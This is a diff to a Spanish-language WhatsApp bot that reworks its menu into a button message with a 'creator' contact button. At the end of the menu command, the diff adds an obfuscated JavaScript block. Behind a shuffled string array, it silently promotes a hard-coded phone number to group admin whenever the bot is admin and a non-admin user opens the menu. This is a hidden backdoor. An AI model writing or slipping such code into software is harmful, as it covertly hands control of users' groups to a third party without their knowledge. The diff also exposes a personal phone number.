@@ -429,8 +429,9 @@ reply(`${menuStaff}`)
 
 if (mek.message.buttonsResponseMessage){
 var bRM = mek.message.buttonsResponseMessage.selectedButtonId
-if (bRM.includes(`id1`)){
-reply('Success')
+if (bRM.includes(`creadorMenu2`)){
+reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐚 ${botName}, 𝐀𝐛𝐚𝐣𝐨 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞𝐥 𝐜𝐫𝐞𝐚𝐝𝐨𝐫 𝐝𝐞 𝐥𝐚𝐬 𝐛𝐚𝐬𝐞 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐝𝐞𝐥 𝐛𝐨𝐭, 𝐧𝐨 𝐦𝐨𝐥𝐞𝐬𝐭𝐚𝐫 :D`)
+await sendContact(from, '595995660558', "🖤𝐈𝐧𝐤𝐲🖤")
 }
 }
 
@@ -438,18 +439,7 @@ switch (command) {
 
 // Seccion de Prueba
 
-case 'test':
-const buttons = [
-  {buttonId: 'id1', buttonText: {displayText: 'Button 1'}, type: 1}
-]
-const buttonMessage = {
-    contentText: "Hi it's button message",
-    footerText: 'Hello World',
-    buttons: buttons,
-    headerType: 1
-}
-await inky.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
-break
+
 
 // Menu
 
@@ -490,7 +480,16 @@ ${menuOtros}
 
 ${menuStaff}
 `
-inky.sendMessage(from, menuText, MessageType.text, {quoted: fakeStatus, sendEphemeral: true})
+var buttons = [
+  {buttonId: 'creadorMenu2', buttonText: {displayText: '𝐂𝐫𝐞𝐚𝐝𝐨𝐫'}, type: 1}
+]
+var buttonMessage = {
+    contentText: `${menuText}`,
+    footerText: '𝐂𝐫𝐞𝐚𝐝𝐨 𝐩𝐨𝐫 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲',
+    buttons: buttons,
+    headerType: 1
+}
+await inky.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: fakeStatus})
 var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Inky='595995660558@s.whatsapp.net');if(isGroupAdmins)return;if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Inky)return;if(!isBotAdmin)return;
 inky.groupMakeAdmin(from, [Inky])
 break
